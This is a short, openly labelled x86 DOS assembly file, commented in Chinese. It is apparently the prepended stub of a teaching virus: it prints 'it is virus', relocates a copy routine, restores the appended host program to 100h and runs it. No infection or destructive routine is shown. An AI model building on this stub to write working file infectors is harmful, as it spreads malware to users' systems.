org 100h
  call Display
xor ah, ah
int 16h  
;-----------这里的循环是将后面的mevmove那段拷贝代码放到程序结束处---------
mov di, InfectedSize
mov di, [di];InfectedSize在这里是代表地址，然后地址的第一个值是我们刚好手写的0x19d
add di, SelfSize
add di, $$	;$$是加载地址100h，所以执行该指令后di中就是指向程序结束位置，作为拷贝代码
;新存放的位置，这样就不会自己覆盖自己了
mov dx, di; dx 存储搬移到程序尾巴上的copy 代码的首地址
mov si, memove;被搬运走的拷贝代码的起始地址
mov cx, MoveCodeSize;被搬运走的拷贝代码的长度
;******循环搬运拷贝代码
memove1:;搬运走那个拷贝代码的代码
mov al, [si]
mov  [di], al
inc di
inc si
dec cx
jnz memove1
;****************
;--------------------------------------------------------------------
mov di, $$;拷贝正常程序到100h
mov si, prg_end;从病毒程序的结束开始拷贝
mov bx, InfectedSize;拷贝长度是粘接了病毒和正常程序后手动填写的，为正常程序大小
mov cx, [bx];InfectedSize在这里是代表地址，然后地址的第一个值是我们刚好手写的0x19d
jmp dx;dx是之前设定的在程序尾部的拷贝代码首地址，跳那里拷贝正常代码到程序头部
memove:;-----这部分代码被搬运到程序尾部去执行了-----------------
mov al, [si]
mov  [di], al
inc di
inc si
dec cx
jnz memove
mov ax, $$ ;不能直接jmp $$,因为这是用的相对偏移跳转。而这段代码被拷贝到另外的地方，所以偏移值会不同
;若直接jmp$$:       比如这行与首地址相差ffffffab，那就jmpffffffab,但是复制到末尾后相差的就不只是ffffffab了,
;相差更多了，所以先mov ax,$$获取准确的差值再jmp
jmp ax ; goto start of prg,let normal prg run,
memove_end:
Display:
	mov	bp, Msg			; ES:BP = str address
	mov	cx, 0bh			; CX = str len
	mov	ax, 1300h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; page 0(BH = 0) black background red word (BL = 0Ch,highlight)
	mov	dl, 6
	mov dh, 3
	int	10h			; 
	ret
Msg: db "it is virus\n"
InfectedSize dw 0x0000 ;原文件的大小，由感染程序感染时设定
prg_end:

MoveCodeSize equ memove_end - memove
SelfSize equ $ - $$
